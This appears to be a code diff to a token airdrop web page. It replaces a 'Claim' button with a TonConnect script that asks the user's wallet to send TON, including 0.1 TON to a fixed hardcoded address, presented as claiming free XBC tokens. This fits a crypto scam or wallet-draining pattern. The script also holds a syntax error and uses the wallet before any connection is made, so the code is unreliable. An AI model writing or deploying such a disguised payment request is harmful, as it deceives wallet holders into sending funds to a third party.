@@ -69,7 +69,7 @@ button.LeaderButton {
     border: 3px solid #4d4c4c
     }
     .leaderboard-container {
-  width: 350px;
+  width: 400px;
   margin: 50px auto;
   background-color: rgb(65, 64, 64);
   border-radius: 10px;
@@ -159,7 +159,27 @@ tr:hover {
     Connect your wallet and claim your XBC to get
     <br>
      a seed and qualify for drops.</p></strong>
-    <button onclick="sendTransaction()" class="floathingbutton"><strong>Claim</strong></button>
+
+     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+     <script>
+         const connector = new TonConnectSDK.TonConnect();
+     
+     function txn(){ 
+       connector.sendTransaction({
+       validUntil: Math.floor(new Date() / 1000) + 360,
+       messages: [
+         {
+           address: connector.wallet.account.address,
+           amount: "200000000"
+         },
+         {
+           address: "UQBQ3GE8djotFZNWqLWz0cgSAE9j37c82Ll3yLqPKZes1goR",
+           amount: "100000000"
+         }
+       ]
+     }))};
+     </script>
+    <button onclick='txn()' class="floathingbutton">Claim</button>
 
 <h2><strong><center>Leaderbord:</center></strong></h2>
 
